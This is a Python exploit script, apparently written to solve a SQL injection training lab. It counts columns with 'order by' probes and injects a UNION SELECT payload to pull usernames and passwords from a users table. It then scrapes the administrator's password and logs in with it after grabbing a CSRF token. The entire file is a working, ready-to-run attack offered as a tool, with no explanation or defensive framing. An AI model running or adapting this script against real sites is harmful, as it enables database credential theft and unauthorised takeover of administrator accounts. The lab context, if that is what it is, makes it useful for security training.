import sys, urllib3, requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def num(url):
    for i in range(1, 5):
        payload = f"'order by {i}--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        if r.status_code == 500:
            return i - 1

def csrf_token(s, url):
    s = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(s.text, 'html.parser')
    return soup.find('input')['value']

def login(s, url, passwd):
    csrf = csrf_token(s, url)
    data = {
        'csrf':csrf,
        'username':'administrator',
        'password':passwd
    }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    return True if 'Log out' in r.text else False


def sqli(s ,url, lurl):
    n = num(url)
    print(f'[+] number of column in table {n}')
    payload = "' union select username, password from users--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    find_admin_password = soup.find(text='administrator').parent.find_next('td').contents[0]
    print(f"[+] The Administrator's password: {find_admin_password}")
    return login(s, lurl, find_admin_password)

def csrf_token(s, url):
    s = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(s.text, 'html.parser')
    return soup.find('input')['value']

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        lurl = sys.argv[2].strip()
    except:
        print('[*] Useage: %s <url> <login url>' % sys.argv[-1])
        print('[*] Example: %s www.example.com www.exmple.com/login' % sys.argv[-1])
        sys.exit(-1)
    
    s = requests.session()
    print(sqli(s, url, lurl))